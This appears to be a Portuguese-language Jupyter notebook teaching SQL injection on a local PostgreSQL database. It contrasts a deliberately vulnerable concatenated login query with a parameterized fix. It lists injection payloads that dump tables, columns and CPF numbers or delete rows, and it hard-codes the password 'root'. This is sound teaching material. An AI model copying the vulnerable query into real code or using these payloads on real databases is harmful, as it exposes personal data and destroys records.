In [1]:
!pip install psycopg2-binary

   ---------------------------------------- 0.0/2.7 MB ? eta -:--:--
   ------------------------------ --------- 2.1/2.7 MB 11.6 MB/s eta 0:00:01
   ---------------------------------------- 2.7/2.7 MB 8.9 MB/s eta 0:00:00


# Versão com Injection

In [28]:
import psycopg2

# conexão com o banco
conn = psycopg2.connect(
    host="localhost",
    database="injection",
    user="postgres",     # ajuste se necessário
    password="root"  # ajuste se necessário
)

cursor = conn.cursor()

# entrada do usuário (simulando formulário de login)
login = input("Digite o login: ")

# consulta vulnerável (concatenação direta)
query = f"SELECT id_usuario, login FROM usuarios WHERE login = '{login}'"

print("\nConsulta enviada ao banco:")
print(query)

try:
    cursor.execute(query)
    resultados = cursor.fetchall()

    print("\nResultados retornados:")
    for r in resultados:
        print(r)

except Exception as e:
    print("Erro na consulta:", e)

cursor.close()
conn.close()

Digite o login:    ' ; DELETE FROM cadastro_usuario WHERE id_usuario = 10 --



Consulta enviada ao banco:
SELECT id_usuario, login FROM usuarios WHERE login = '  ' ; DELETE FROM cadastro_usuario WHERE id_usuario = 10 --'
Erro na consulta: no results to fetch


## injections
  ' OR 1=1 --
  ' UNION SELECT 1, current_database() --
  ' UNION SELECT 1, tablename FROM pg_tables WHERE schemaname='public' --
  ' UNION SELECT * FROM cadastro_usuario --
  ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'cadastro_usuario' --
  ' UNION SELECT id_usuario, nome FROM cadastro_usuario --
  ' UNION SELECT id_usuario, cpf FROM cadastro_usuario --
  ' ; SELECT * from cadastro_usuario -- #stack
  ' UNION SELECT 1, table_name FROM information_schema.tables --
  ' ; DELETE FROM cadastro_usuario WHERE id_usuario = 9 -- #conn.commit()

# Versão sem injection

In [30]:
import psycopg2

# conexão com o banco
conn = psycopg2.connect(
    host="localhost",
    database="injection",
    user="postgres",
    password="root"
)

cursor = conn.cursor()

# entrada do usuário
login = input("Digite o login: ")

# consulta segura com parâmetro
query = "SELECT id_usuario, login FROM usuarios WHERE login = %s"

print("\nConsulta enviada ao banco (com parâmetro):")
print(query)

try:
    cursor.execute(query, (login,))
    resultados = cursor.fetchall()

    print("\nResultados retornados:")
    for r in resultados:
        print(r)

except Exception as e:
    print("Erro na consulta:", e)

cursor.close()
conn.close()

Digite o login:  user1



Consulta enviada ao banco (com parâmetro):
SELECT id_usuario, login FROM usuarios WHERE login = %s

Resultados retornados:
(1, 'user1')
